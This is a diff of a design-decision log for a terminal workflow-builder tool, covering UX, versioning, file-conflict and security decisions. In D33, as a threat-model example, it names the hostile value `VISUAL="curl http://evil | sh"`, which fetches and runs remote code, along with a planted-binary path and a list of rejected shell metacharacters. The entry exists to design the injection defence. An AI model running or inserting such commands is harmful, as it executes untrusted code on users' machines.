@@ -174,7 +174,7 @@
 - **Question:** What input modalities does the builder support?
 - **Decision:** Keyboard and mouse are both first-class. Every action is reachable by both.
 - **Rationale:** User stated explicitly "mouse and keyboard integration".
-- **Evidence:** User input. Existing mouse handling at `src/internal/ui/model.go:217`. `tea.WithMouseCellMotion()` at `src/cmd/pr9k/main.go:174`.
+- **Evidence:** User input. Existing mouse handling at `src/internal/ui/model.go:217`. `tea.WithMouseCellMotion()` at `src/cmd/pr9k/main.go:175`.
 - **Rejected alternatives:**
   - Keyboard-only v1.
 - **Linked technical notes:** —
@@ -199,14 +199,15 @@
 ## D15: Companion-file copy scope
 
 - **Question:** When copying the default target, which companion files get copied?
-- **Decision:** Configuration file, every prompt file referenced by any step, every script file referenced by any step. Unreferenced files are not copied.
-- **Rationale:** Avoids surprising the user with orphan files.
-- **Evidence:** Default bundle layout at `workflow/`. Narrow-reading ADR — config is the source of truth.
+- **Decision:** Configuration file, every prompt file referenced by any step, every script file referenced by any step, AND the script referenced by the top-level `statusLine.command` field when a `statusLine` block is present. Unreferenced files are not copied.
+- **Rationale:** Avoids surprising the user with orphan files, while ensuring the copy is self-sufficient. The original phrasing omitted the `statusLine` script because it named only "steps" — a copy of a default-with-statusLine bundle would have produced a broken copy that fails validation on first load. Adversarial-validator round 1 (F51) caught this by cross-referencing the default bundle's ship-state against the copy rule.
+- **Evidence:** Default bundle layout at `workflow/` — the bundled default ships a `statusLine` block pointing at `scripts/statusline`. Validator `statusLine` block at `src/internal/validator/validator.go:259-273`. Narrow-reading ADR — config is the source of truth.
 - **Rejected alternatives:**
   - Copy full directory tree.
   - Copy only the config file.
+  - Copy without the statusLine script.
 - **Linked technical notes:** —
-- **Driven by findings:** F13
+- **Driven by findings:** F13, F51
 - **Dependent decisions:** D32
 - **Referenced in spec:** Alternate Flows — Copy-default-to-local
 
@@ -229,7 +230,7 @@
 - **Question:** How does the builder handle symlinks in the target directory and its companion files?
 - **Decision:** Follow symlinks (matching the existing `src/internal/cli/args.go` precedent for `--workflow-dir` and `--project-dir`), and display a "symlink banner" during the session naming each affected path. The first save requires explicit confirmation. Saves to a symlinked configuration file write through the symlink to its target rather than replacing the symlink with a regular file.
 - **Rationale:** User input on Q-B. Rejecting symlinks would break legitimate uses (a user who symlinks their bundle into `.pr9k/workflow/` from elsewhere). Silent following creates an invisible attack surface. Visibility-plus-confirmation balances the two.
-- **Evidence:** User input on Q-B. `EvalSymlinks` usage at `src/internal/cli/args.go:50, 100, 118`. Security-F4. Edge-case 3-A, 3-E, 4-D.
+- **Evidence:** User input on Q-B. `EvalSymlinks` usage at `src/internal/cli/args.go:50, 101, 118`. Security-F4. Edge-case 3-A, 3-E, 4-D.
 - **Rejected alternatives:**
   - Reject symlinks that escape the tree.
   - Follow silently.
@@ -326,7 +327,7 @@
 - **Question:** How does the user discover the builder's keyboard shortcuts?
 - **Decision:** A persistent **shortcut footer** in every edit-view mode shows the shortcuts available in the current focus. A **help modal** is unconditionally reachable via `?` from any edit-view mode (not gated on status-line configuration).
 - **Rationale:** UX-002 and UX-015. The existing TUI's `?` gate on `statusLineActive` is already a defect; the builder must not inherit it. A richer editor with many shortcuts needs an always-available discovery surface.
-- **Evidence:** UX findings UX-002, UX-015. Existing shortcut constants at `src/internal/ui/ui.go:35-44`.
+- **Evidence:** UX findings UX-002, UX-015. Existing shortcut constants at `src/internal/ui/ui.go:35-44`. Existing `?` / `statusLineActive` gate at `src/internal/ui/keys.go:81` (the defect the builder must not inherit — the `keys.go` location, not `ui.go:81`, which is the `handleError` case).
 - **Rejected alternatives:**
   - Gate `?` on some other condition.
   - Documentation-only shortcut list.
@@ -352,14 +353,15 @@
 ## D26: Initial cursor focus
 
 - **Question:** Which item is focused when the edit view first opens?
-- **Decision:** The cursor is placed on the first step of the iteration phase. If the iteration phase is empty, the cursor is placed on the iteration phase header itself.
-- **Rationale:** Iteration is the most-edited phase (the Ralph loop operates entirely in iteration). UX-004.
-- **Evidence:** UX-004.
+- **Decision:** The cursor is placed on the first step of the **iteration phase** when the phase has at least one step. If the iteration phase is empty, the cursor falls back to the first step of the first non-empty phase in the order initialize → iteration → finalize; if all three phases are empty (only possible transiently before the scaffold-from-empty placeholder is added — the validator forbids a saved workflow with zero iteration steps), the cursor is placed on the iteration phase header.
+- **Rationale:** The validator requires iteration to have at least one step (category 3 phase-size rule), so the "iteration has a step" branch is the common case for any valid loaded workflow. Placing the cursor there keeps the first keystroke productive without encoding Ralph-specific knowledge: the preference for iteration is grounded in the schema's own invariant (iteration is the only always-non-empty phase), not in any assumption about how Ralph-shaped workflows distribute their edits. An earlier draft grounded this decision in "iteration is the most-edited phase" — adversarial review (F52) correctly flagged that claim as a behavioral assertion about users without codebase evidence and as Ralph-specific knowledge the builder should not bake in. The schema-grounded rationale above replaces it.
+- **Evidence:** UX-004. Validator minimum-phase-size rule at `src/internal/validator/validator.go` (category 3) — iteration must have at least one step.
 - **Rejected alternatives:**
   - No initial focus.
   - Focus on the first section header regardless.
+  - Retain the "most-edited phase" rationale — rejected as unfalsifiable and as a narrow-reading violation.
 - **Linked technical notes:** —
-- **Driven by findings:** F4
+- **Driven by findings:** F4, F52
 - **Dependent decisions:** —
 - **Referenced in spec:** Primary Flow step 6
 
@@ -450,29 +452,32 @@
 ## D33: Editor execution model
 
 - **Question:** How is the `$VISUAL` / `$EDITOR` value parsed and invoked?
-- **Decision:** Parse the value with shell-style word splitting (first token is the command, remaining tokens are arguments). Reject values containing shell metacharacters (`$`, backticks, `;`, `|`, `&`, `<`, `>`, newline). Reject relative paths that are not resolvable via `PATH` to an existing executable. Invoke the editor directly via the OS exec mechanism, not via `sh -c`.
-- **Rationale:** Security-F2. Direct exec with whitespace-split handles the realistic case (`VISUAL="code --wait"`) without introducing shell injection. Rejecting metacharacters and non-PATH relative paths closes off the two principal attack vectors (`VISUAL="curl http://evil | sh"` and `VISUAL="./planted-binary"`).
-- **Evidence:** Security-F2. Edge-case 5-A, 5-E.
+- **Decision:** Parse the value with shell-style word splitting (first token is the command, remaining tokens are arguments). Reject values containing characters that would be interpreted by a shell but have no meaning under direct exec: backticks, `;`, `|`, `&`, `<`, `>`, newline. `$` is **not** rejected — under direct exec (no `sh -c`), `$` is a literal character with no meaning, and legitimate user values like `VISUAL='$HOME/bin/myvim'` (single-quoted in the user's shell so the variable never expands) are valid program paths that must work. Reject relative paths that do not resolve via `PATH` to an existing executable. Invoke the editor directly via the OS exec mechanism, not via `sh -c`.
+- **Rationale:** Security-F2. Direct exec with whitespace-split handles the realistic case (`VISUAL="code --wait"`) without introducing shell injection. The two principal attack vectors (`VISUAL="curl http://evil | sh"` and `VISUAL="./planted-binary"`) are closed by the `|` rejection and the path check — `$` rejection is redundant for those and wrongly rejects legitimate literal-`$` paths. Adversarial review (F53) caught the overcautious `$` rejection.
+- **Evidence:** Security-F2. Edge-case 5-A, 5-E. Adversarial-validator F53.
 - **Rejected alternatives:**
   - `sh -c $VISUAL "$@"` — command injection surface.
   - Treat whole value as program name — breaks common `VISUAL="vim -u NONE"` pattern.
+  - Reject `$` along with other metacharacters — rejected because direct exec does not interpret `$`.
 - **Linked technical notes:** T2
-- **Driven by findings:** F8, F9, F29, F36
+- **Driven by findings:** F8, F9, F29, F36, F53
 - **Dependent decisions:** —
 - **Referenced in spec:** Alternate Flows — External-editor invocation, Editor binary cannot be spawned
 
 ## D34: Step reorder UX
 
 - **Question:** How does the user discover and perform step reordering?
-- **Decision:** Each step row in the outline shows a persistent gripper glyph (`⠿`) at its left edge. Keyboard reorder is `Alt+↑` and `Alt+↓`, documented in the shortcut footer whenever a step row is focused. Mouse drag on the gripper glyph (or anywhere on the row) also reorders. Cross-phase drag is not supported — dragging a step past a phase boundary visibly drops it at the phase's edge.
-- **Rationale:** UX-005. Persistent glyph makes draggability discoverable without hover. `Alt+↑/↓` mirrors common editor conventions (VS Code, JetBrains). Cross-phase move is deferred to avoid the semantic landmines (scope changes to `captureAs` bindings, phase-dependent constraints like `breakLoopIfEmpty`).
-- **Evidence:** UX-005, Edge-case 8-B.
+- **Decision:** Each step row in the outline shows a persistent gripper glyph (`⋮⋮`) at its left edge. Keyboard reorder supports two paths: primary is `Alt+↑` / `Alt+↓` (mirrors VS Code / JetBrains); fallback is a **reorder mode** entered by pressing `r` on a focused step — `↑`/`↓` move the step while reorder mode is active, `Enter` commits, `Esc` cancels. The fallback exists because `Alt` as a modifier is intercepted by many tmux setups (tmux's default `escape-time` converts `Alt+key` to `Esc key` two-event sequence), mosh, and some SSH clients. Mouse drag on the gripper glyph (or anywhere on the row) also reorders. Cross-phase drag is not supported — dragging a step past a phase boundary visibly drops it at the phase's edge. The reorder viewport auto-scrolls to keep the moving step visible when it crosses the viewport boundary. The gripper uses `⋮⋮` (U+22EE twice), which has broader terminal-font coverage than Braille block glyphs like `⠿` (U+283F).
+- **Rationale:** UX-005 drove the persistent gripper and keyboard shortcut. Adversarial review (F54) verified that `⠿` (Braille pattern) requires font support not guaranteed on Windows default fonts, macOS San Francisco, or minimal container environments — falling back to a vertical-ellipsis pair (`⋮⋮`) keeps the signifier affordance on terminals the main pr9k command already supports. UX round 2 (F55) surfaced that the sole `Alt+↑/↓` binding silently breaks under the exact environment the spec itself recommends for long sessions (tmux per the SIGHUP mitigation), so a non-modifier fallback is required. The reorder-mode pattern (press key, enter mode, move with arrows, commit/cancel) is a common TUI convention and does not collide with in-field text input (which never sees `r` bare — text fields consume `r` as a character, and the reorder-mode trigger fires only when a step row is focused in the outline). Viewport auto-scroll on reorder (per F60) extends D29's navigation-auto-scroll to reorder keys so a user moving a step past the fold does not lose visual contact. Cross-phase move remains out of scope to avoid `captureAs` scope landmines.
+- **Evidence:** UX-005, UX-004 (Alt fragility under tmux), Edge-case 8-B. Unicode block coverage — U+283F is in the Braille Patterns block (U+2800–U+28FF), U+22EE is in the Mathematical Operators block, universally present in monospace fonts.
 - **Rejected alternatives:**
   - Hover-only gripper — invisible in terminals.
   - Single-key reorder (`[`/`]`) — collides with text-input fields.
+  - Braille gripper `⠿` — font coverage risk.
+  - `Alt+↑/↓` only, no fallback — silently broken under tmux.
   - Allow cross-phase drag — scope creep and semantic trap for the user.
 - **Linked technical notes:** —
-- **Driven by findings:** F5, F32
+- **Driven by findings:** F5, F32, F54, F55, F60
 - **Dependent decisions:** —
 - **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances
 
@@ -506,15 +511,16 @@
 
 ## D37: Version bump
 
-- **Question:** What version bump does this feature require?
-- **Decision:** Shipping the `pr9k workflow` subcommand is a backwards-compatible addition to the CLI surface. Per `docs/coding-standards/versioning.md` section on 0.y.z, backwards-compatible CLI additions bump the patch version. The feature PR must also include the version bump commit.
-- **Rationale:** DevOps Finding 1 / Jr-F6. The subcommand name becomes part of pr9k's public API; downstream tooling gating on a minimum pr9k version needs a version to gate on.
-- **Evidence:** `docs/coding-standards/versioning.md` — 0.y.z rules. `src/internal/version/version.go` is the single source of truth.
+- **Question:** What version bump does this feature require, and how is it delivered?
+- **Decision:** Shipping the `pr9k workflow` subcommand is a backwards-compatible addition to the CLI surface. Per `docs/coding-standards/versioning.md`'s 0.y.z rules, backwards-compatible CLI additions bump the patch version. The version bump is **its own commit** within the feature PR (or a separate PR landed first), not a drive-by edit mixed into a feature commit. The coding standard explicitly calls the bundled form "a drive-by edit in a feature PR" and prohibits it; the single-file `version.go` exception does not apply because this feature introduces substantial Go source outside `version.go`.
+- **Rationale:** DevOps Finding 1 / Jr-F6 flagged the bump itself; adversarial review F57 (and the Jr-F1 of this round) flagged the original wording "must also include the version bump commit" as ambiguous — a reader could interpret "include" as "bundle into a feature commit." The coding standard is explicit that the bump travels in its own commit so diff reviewers can audit the version change independently of feature code. The subcommand name becomes part of pr9k's public API; downstream tooling gating on a minimum pr9k version needs a version to gate on.
+- **Evidence:** `docs/coding-standards/versioning.md` — 0.y.z rules AND the "bump is its own commit, not a drive-by edit in a feature PR" rule on the same page. `src/internal/version/version.go` is the single source of truth.
 - **Rejected alternatives:**
   - Minor bump — reserved for schema-breaking additions under 0.y.z.
   - No bump — hides the surface change from downstream gating.
+  - Bundling the bump into a feature commit — prohibited by the coding standard.
 - **Linked technical notes:** —
-- **Driven by findings:** F21
+- **Driven by findings:** F21, F57
 - **Dependent decisions:** —
 - **Referenced in spec:** Versioning
 
@@ -562,14 +568,15 @@
 ## D41: Cross-session mutation detection
 
 - **Question:** How does the builder detect and communicate concurrent or intervening changes to the configuration file?
-- **Decision:** On load, snapshot the configuration file's modification time and size. At save, re-stat the file; if the values have changed, show a conflict dialog naming the mismatch with three actions: overwrite with the builder's in-memory state, reload from disk and discard in-memory edits, or cancel the save. Last-completed-save wins when two builder sessions save simultaneously — the mtime snapshot catches only on-disk changes, not a concurrent builder session that has not yet saved.
-- **Rationale:** Edge-case 10-A. Full cross-process locking is out of scope (D9), but a best-effort collision signal is much better than silent overwrite.
-- **Evidence:** Edge-case 10-A, Security-F9.
+- **Decision:** On load, snapshot the configuration file's modification time and size. After every successful save, the builder refreshes this snapshot so the next comparison is against the just-written state. At save, re-stat the file; if the values have changed since the snapshot, show a conflict dialog naming the mismatch with three actions: overwrite with the builder's in-memory state, reload from disk and discard in-memory edits, or cancel the save. Last-completed-save wins when two builder sessions save simultaneously — the mtime snapshot catches only on-disk changes, not a concurrent builder session that has not yet saved. **Known limitation:** on filesystems with one-second mtime resolution (HFS+, FAT32, many network filesystems), two saves within the same clock second that produce files of identical size are indistinguishable from no external change; the conflict dialog will not fire. This is a best-effort signal — documented as a known limitation rather than hidden.
+- **Rationale:** Edge-case 10-A drove the original decision. Adversarial review (F58) verified the same-second same-size false-negative path and flagged that silence about it sets the wrong user expectation. Edge-case review round 2 (F59) caught the missing snapshot refresh after save — without it, every save after the first in a session would see its own write as a conflict (because the file's current mtime matches the just-written state but the snapshot is the pre-save value). Full cross-process locking is out of scope (D9), but a best-effort collision signal is much better than silent overwrite for the common case.
+- **Evidence:** Edge-case 10-A, Security-F9. Filesystem mtime resolution documented in APFS/ext4 vs. HFS+/FAT32 platform notes (nanosecond vs. one-second). Adversarial-validator F58. Edge-case-explorer round 2 F59.
 - **Rejected alternatives:**
   - Multi-session locking — out of scope.
   - No detection — silent overwrite.
+  - Hide the same-second false-negative case from users — rejected for honest-expectation-setting.
 - **Linked technical notes:** T1
-- **Driven by findings:** F23, F28, F34, F41
+- **Driven by findings:** F23, F28, F34, F41, F58, F59
 - **Dependent decisions:** —
 - **Referenced in spec:** Edge Cases table; Out of Scope
 
@@ -591,7 +598,7 @@
 - **Question:** What happens when the user pastes multi-line or ANSI-escaped content into a single-line input field?
 - **Decision:** Newlines and ANSI escape sequences are stripped from pasted input at input time. The field accepts the sanitized remainder. When stripping occurs, a brief "pasted content sanitized" message is shown. Structured fields (step names, model names, prompt paths, script paths) additionally enforce a soft length cap with a visible warning when exceeded.
 - **Rationale:** Edge-case 7-A, 7-B, 7-C. An un-sanitized newline in a step name produces a valid-JSON but confusing workflow; ANSI escapes pass through to the log panel and status-line.
-- **Evidence:** Edge-case 7-A, 7-B, 7-C. Existing ANSI stripping in sandbox output at `src/cmd/pr9k/sandbox.go:69`.
+- **Evidence:** Edge-case 7-A, 7-B, 7-C. Existing ANSI stripping in sandbox output at `src/cmd/pr9k/sandbox.go:73` (the `stripANSI` function; the regex var it uses is at line 69).
 - **Rejected alternatives:**
   - Preserve all pasted content — creates structural-field corruption.
   - Reject the paste entirely — unhelpful when paste is mostly fine.
@@ -641,3 +648,293 @@
 - **Driven by findings:** F33
 - **Dependent decisions:** —
 - **Referenced in spec:** Edge Cases table
+
+## D45: Choice-list keyboard contract
+
+- **Question:** How does a constrained-value choice list behave under keyboard interaction — open, navigate, confirm, dismiss?
+- **Decision:** When a constrained-value field is focused, `Enter` or `Space` opens its choice list. `↑`/`↓` navigate between options. `Enter` confirms the highlighted option and closes the list. `Escape` dismisses the list restoring the previously saved value (no change committed). Typing an alphabetic character while the list is open jumps to the next option whose label starts with that character (typeahead).
+- **Rationale:** UX-008 flagged that choice-list keyboard behavior was unspecified — the `▾` glyph signaled the field was constrained but told the user nothing about how to interact. Without spec-level commitment, implementations would diverge (Enter opens vs. Enter selects vs. no keyboard support). The footer's per-focus shortcut list cannot be populated without these bindings. The chosen conventions match standard dropdown idioms used across GUI and TUI frameworks.
+- **Evidence:** UX round 2 F61.
+- **Rejected alternatives:**
+  - Space-only to open — less discoverable; Enter is the universal confirm key users try first.
+  - Escape exits edit-view entirely — disruptive and inconsistent with Escape as cancel elsewhere.
+- **Linked technical notes:** —
+- **Driven by findings:** F61
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances
+
+## D46: Add-item affordance and keyboard binding
+
+- **Question:** How does the user discover and trigger "add a step" or "add an env entry" or "add a containerEnv pair"?
+- **Decision:** Every list-typed outline section (each phase, `env`, `containerEnv`) ends with a visible trailing row rendered as `+ Add <item-type>` (for example, `+ Add step`, `+ Add env variable`, `+ Add container env entry`). Focus on this row shows `Enter  add` in the shortcut footer. `Enter` creates a new empty item of that type, focuses its first editable field (in the detail pane), and shifts the `+ Add ...` row down so another add is one keystroke away. The same affordance is invoked by mouse click. The keyboard shortcut `a` while a phase header or list section header is focused is a secondary entry point that jumps to the `+ Add` row and triggers it in one keystroke.
+- **Rationale:** UX round 2 F62 flagged add-step as a task-blocker — the prior spec said "add-step affordances at the phase level" without naming the signifier or the key. The visible trailing row is the most discoverable pattern available in a purely text terminal (no hover, no right-click menu tradition); it also normalizes every list-typed section under the same affordance. The secondary `a` keybinding gives keyboard-fluent users a single-key path without hunting for the row.
+- **Evidence:** UX round 2 F62. Nielsen heuristic 6 (recognition over recall).
+- **Rejected alternatives:**
+  - Footer-only `a` shortcut with no visible row — users who skim the outline see no add affordance.
+  - Right-click context menu — the existing TUI has no right-click handling (see `src/internal/ui/model.go:217` — left-click/wheel only).
+  - Separate "add-step mode" with modal prompt for kind — slower than "add empty then choose kind inline."
+- **Linked technical notes:** —
+- **Driven by findings:** F62
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances
+
+## D47: Secret-reveal keyboard binding
+
+- **Question:** How does a keyboard-only user reveal a masked `containerEnv` secret value?
+- **Decision:** When a `containerEnv` value field whose key matches the secret pattern is focused, the detail pane renders the value as the masked placeholder `••••••••` (eight bullets) with a small affixed label `[press r to reveal]`. Pressing `r` toggles the field between masked and revealed; the toggle state is per-field and lasts until focus leaves the field (on focus loss the field re-masks). The shortcut footer shows `r reveal` when focus is on a secret-masked field.
+- **Rationale:** UX round 2 F63 flagged that D20 committed to "a reveal affordance the user can toggle" without naming the signifier or keybinding — a mouse-only user could toggle, a keyboard-only user could not. Equitable use (Universal Design Principle 1) requires both paths. Re-masking on focus loss prevents accidental exposure when the user tabs away from a revealed field without explicitly re-masking. The `[press r to reveal]` label is a small but persistent signifier — richer than a bare `••••••••` which gives the user no path forward.
+- **Evidence:** UX round 2 F63. D20 original decision (mask by default with reveal toggle).
+- **Rejected alternatives:**
+  - Bare `••••••••` with no label — keyboard-only users have no discovery path.
+  - Reveal state persists until session end — exposes secret across subsequent navigation.
+  - `R` (shift+r) — collides with reorder mode (D34).
+- **Linked technical notes:** —
+- **Driven by findings:** F63
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 7; User Interactions — Feedback
+
+## D48: Dialog convention standard
+
+- **Question:** Do the builder's dialogs follow a consistent keyboard and visual convention?
+- **Decision:** Every modal / dialog / non-blocking notice in the builder follows one convention:
+  - **Escape is equivalent to "cancel"** or "no" in every dialog. Escape never commits a destructive action.
+  - **The safe option (cancel / keep / leave) is the keyboard default** — it is the option activated by pressing `Enter` from the initial dialog state.
+  - **Destructive options are never the keyboard default** and are always at least one explicit navigation away (arrow key or Tab) from the initial focus.
+  - **Option vocabulary is drawn from a fixed lexicon:** Save, Discard, Overwrite, Reload, Cancel, Close, Delete, Keep, Retry, Confirm. Ad-hoc labels ("leave", "continue anyway") are normalized to the lexicon.
+  - **Option spatial order, left-to-right or top-to-bottom:** primary-safe action first, secondary actions middle, destructive last.
+  - **Dialogs re-layout on terminal resize** (same behavior the existing TUI applies to overlays).
+- **Rationale:** UX round 2 F64 catalogued eight distinct dialogs across the spec with inconsistent option vocabularies and unspecified Escape behavior. Establishing a single convention at spec level means the per-dialog text in the spec inherits the convention and implementations stay consistent without repeated per-dialog commitments.
+- **Evidence:** UX round 2 F64.
+- **Rejected alternatives:**
+  - Per-dialog convention — guarantees inconsistency across eight dialogs.
+  - Ad-hoc option labels — each dialog reads differently, trains the user inconsistently.
+- **Linked technical notes:** —
+- **Driven by findings:** F64
+- **Dependent decisions:** —
+- **Referenced in spec:** new Dialog Conventions section; Alternate Flows (all dialogs)
+
+## D49: Session-header banner priority
+
+- **Question:** When multiple session-header banners are simultaneously active, how does the builder present them?
+- **Decision:** The session header shows at most one warning banner at a time, selected by the following priority (highest first): read-only, external-workflow, symlink, shared-install, unknown-field. The suppressed banners are accessible via a `[N more warnings]` indicator on the session header that opens a banner panel listing all active banners when selected. The persistent-state indicators (target path, unsaved-changes indicator) always render, regardless of banner count.
+- **Rationale:** UX round 2 F65 flagged that the session header could legitimately carry five warning banners plus target path plus unsaved-changes indicator plus findings summary simultaneously, overflowing on narrow terminals. Progressive disclosure (highest-priority banner only, with affordance to see the others) keeps critical context visible without crowding. Priority ordering puts the most actionable warning first: read-only is the most-limiting (no save possible), followed by the visibility-critical security warnings (external, symlink), then informational warnings (shared-install, unknown-field).
+- **Evidence:** UX round 2 F65. Nielsen heuristic 8 (aesthetic and minimalist design).
+- **Rejected alternatives:**
+  - Stack all banners vertically — consumes vertical space needed for outline and detail pane on short terminals.
+  - Show all banners on one line with pipe separators — overflows at 80 columns.
+  - Hide all banners except the first active — loses actionable information silently.
+- **Linked technical notes:** —
+- **Driven by findings:** F65
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances
+
+## D50: Landing-page option subtitles
+
+- **Question:** How does a first-time user know what each landing-page option means without prior knowledge of pr9k's directory model?
+- **Decision:** Each landing-page option is rendered with a one-line subtitle showing the resolved absolute path it would open. For example, "Edit the default target in place" renders as the option label above a subtitle reading `/usr/local/share/pr9k/workflow/`; "Edit the local project's workflow" renders with the subtitle `/home/user/myproject/.pr9k/workflow/`; "Edit a workflow in another folder" renders without a subtitle (path is not yet chosen).
+- **Rationale:** UX round 2 F66 flagged that "the default target," "the local project's workflow," and "another folder" are jargon for users who do not know pr9k's two-candidate directory resolution. Showing the concrete path lets the user recognize their target without needing the mental model. The paths are already resolved at landing-page construction time (see D3) — no new computation is introduced.
+- **Evidence:** UX round 2 F66. D3 (target resolution rules). Nielsen heuristic 2 (match between system and real world).
+- **Rejected alternatives:**
+  - Inline tooltip revealed on hover — terminals have no hover state.
+  - Single introductory paragraph at the top of landing — does not help once users scroll the paragraph off-screen.
+- **Linked technical notes:** —
+- **Driven by findings:** F66
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 3
+
+## D51: Section summary content
+
+- **Question:** What does the detail pane show when a section header in the outline is focused?
+- **Decision:** Each of the six outline section types has a defined summary content in the detail pane:
+  - **`env` section:** a comma-separated list of up to 8 env variable names, with `+ N more` suffix if the list exceeds 8. Count of total entries shown above the list.
+  - **`containerEnv` section:** same treatment on the keys — key names only, never the values. Secret-named keys are shown but still masked. Count of total entries above.
+  - **`statusLine` block (when present):** the `type` value, the `command` value (truncated with ellipsis if longer than the pane width), and the resolved `refreshIntervalSeconds` value.
+  - **`initialize` phase:** the count of steps; an ordered list of up to 8 step names, each annotated with its kind (Claude / shell), with `+ N more` if exceeded.
+  - **`iteration` phase:** same as initialize.
+  - **`finalize` phase:** same as initialize.
+  - **Any empty section** (zero items): renders `(empty — no items configured)` in the detail pane, along with the same `+ Add <item-type>` affordance that appears in the outline (so the user can add an item from either side).
+- **Rationale:** UX round 2 F67 flagged that D28 committed to a "section summary" containing "counts, top-level field values" without enumerating what those are per section type. Without enumeration, implementations would render empty pages or near-empty counts that fail the visibility heuristic. Enumerating the content here commits to a useful summary across all six section types.
+- **Evidence:** UX round 2 F67.
+- **Rejected alternatives:**
+  - Count-only summary — uninformative for users who collapsed a section to scan it.
+  - Show all items without truncation — unbounded content in the detail pane.
+- **Linked technical notes:** —
+- **Driven by findings:** F67
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances
+
+## D52: Detail pane scrollability
+
+- **Question:** How does the detail pane behave when a step or section has more fields than fit in the visible pane height?
+- **Decision:** The detail pane is independently scrollable from the outline, with a visible scroll-position indicator when its content exceeds viewport height. Keyboard Tab / arrow navigation between fields auto-scrolls the pane to keep the focused field visible. Mouse wheel events are routed to whichever pane the pointer is over (outline when pointer is left of the split, detail pane when pointer is right).
+- **Rationale:** UX round 2 F68 flagged that D29 specified outline scrollability but said nothing about the detail pane. A Claude step has eleven fields (name, model, promptFile, isClaude, captureAs, captureMode, breakLoopIfEmpty, skipIfCaptureEmpty, timeoutSeconds, onTimeout, resumePrevious) — on a modest-height terminal the pane cannot show them all. Without an independent scroll commitment, fields below the fold are invisible.
+- **Evidence:** UX round 2 F68. D29 (outline scrollability precedent).
+- **Rejected alternatives:**
+  - Share the outline's scroll — conflates two independent contents.
+  - Page-based detail pane — less smooth than continuous scroll.
+- **Linked technical notes:** —
+- **Driven by findings:** F68
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 5; User Interactions — Affordances
+
+## D53: Post-save success feedback
+
+- **Question:** What does the user see immediately after a successful save?
+- **Decision:** Three feedback elements fire together on successful save: (a) the session header's unsaved-changes indicator clears; (b) a transient status line reading `Saved at HH:MM:SS` appears in the session header for 3 seconds, then clears to the normal session-header state; (c) if the save required validator acknowledgment for non-blocking findings, the acknowledgment dialog is dismissed. No other state changes — outline focus, detail pane focus, and scroll positions are preserved.
+- **Rationale:** UX round 2 F69 flagged that the original spec said "save proceeds silently" when there were no findings — silence is the absence of feedback, not a success state. Users need explicit confirmation that their write landed. The transient timestamp in the banner gives positive confirmation without permanently consuming header space. The 3-second duration matches standard TUI toast conventions.
+- **Evidence:** UX round 2 F69. Nielsen heuristic 1 (visibility of system status).
+- **Rejected alternatives:**
+  - Silent success — fails visibility heuristic.
+  - Modal "Saved" dialog — adds a click-through for every save.
+  - Persistent "Saved at HH:MM:SS" until next action — clutters the header.
+- **Linked technical notes:** —
+- **Driven by findings:** F69
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 9; User Interactions — Feedback
+
+## D54: Discard safety in unsaved-quit dialog
+
+- **Question:** How does the builder protect against accidental discard of an entire session's unsaved edits?
+- **Decision:** In the unsaved-changes quit dialog, the keyboard-default option is **Cancel** (pressing `Enter` from the initial dialog state cancels the quit). The three options are spatially ordered: **Save** (primary safe), **Cancel** (also safe, and the escape-equivalent), **Discard** (destructive, rightmost, visually de-emphasized). Choosing Discard does NOT immediately discard — it prompts a second confirmation: `Discard all unsaved changes? This cannot be undone. (y/N)`, with `N` as the keyboard default. Only a positive `y` or explicit arrow+Enter through both prompts discards. Escape at any step cancels.
+- **Rationale:** UX round 2 F70 / F71 flagged that the original three-way dialog had no confirmation guard on Discard, and that Discard could be reached from the initial dialog with a single misfire (down-arrow + Enter). D7's "no undo history" means Discard is irreversible. Given the stakes (all session edits lost), the two-step confirmation matches the pattern used for remove-step in the detail pane (D21) and prevents a fatigued user from losing their work via an accidental keystroke.
+- **Evidence:** UX round 2 F70, F71. D7 ("no undo history"). Universal Design Principle 5 (tolerance for error).
+- **Rejected alternatives:**
+  - Single-step discard with cancel as default only — insufficient for irreversible action.
+  - Three-step confirmation — disproportionate friction.
+  - Require typing a specific word ("discard") — excessive for a keyboard TUI.
+- **Linked technical notes:** —
+- **Driven by findings:** F70, F71
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 10; Alternate Flows — Unsaved-changes quit
+
+## D55: Focus restoration after findings-panel dismiss
+
+- **Question:** Where does focus land when the user manually dismisses the findings panel?
+- **Decision:** Focus returns to the field or outline item that was focused immediately before the panel was opened (or, equivalently, the last field the user interacted with before the panel took focus). If no prior focus was recorded (e.g., the panel was the first thing the user interacted with), focus lands on the first step of the iteration phase (same fallback as initial cursor focus in D26).
+- **Rationale:** UX round 2 F72 flagged that the panel dismiss behavior had no specified focus-return point, which disorients keyboard-only users in the read-finding → fix-field → re-check-panel → dismiss cycle.
+- **Evidence:** UX round 2 F72. WCAG 2.2 SC 2.4.3 (focus order).
+- **Rejected alternatives:**
+  - Focus always returns to the outline top — destroys the user's editing position.
+  - Focus returns to the findings panel's position (i.e., "nothing" after dismiss) — non-sensical keyboard state.
+- **Linked technical notes:** —
+- **Driven by findings:** F72
+- **Dependent decisions:** —
+- **Referenced in spec:** Primary Flow step 9; D35
+
+## D56: Error message template for edge-case failures
+
+- **Question:** What content does each "clear error" in the Edge Cases table commit to?
+- **Decision:** Every error-mode commitment in the Edge Cases table renders in a modal error dialog that includes, at minimum, four elements:
+  1. **What happened** — a single sentence naming the operation that failed, in user-visible vocabulary ("Could not save workflow", "Could not read prompt file").
+  2. **Why** — a short phrase naming the condition (the OS error, the file path, or the validator finding that caused the failure).
+  3. **In-memory state commitment** — either "Your edits are still in memory — you can retry or choose a different target" or "No edits were lost." This sentence is required for every failure that leaves edit state intact.
+  4. **Available action** — a bulleted list of the dialog's options using the D48 lexicon (Retry, Cancel, Close, Reload, etc.) with the safe option as keyboard default per D48.
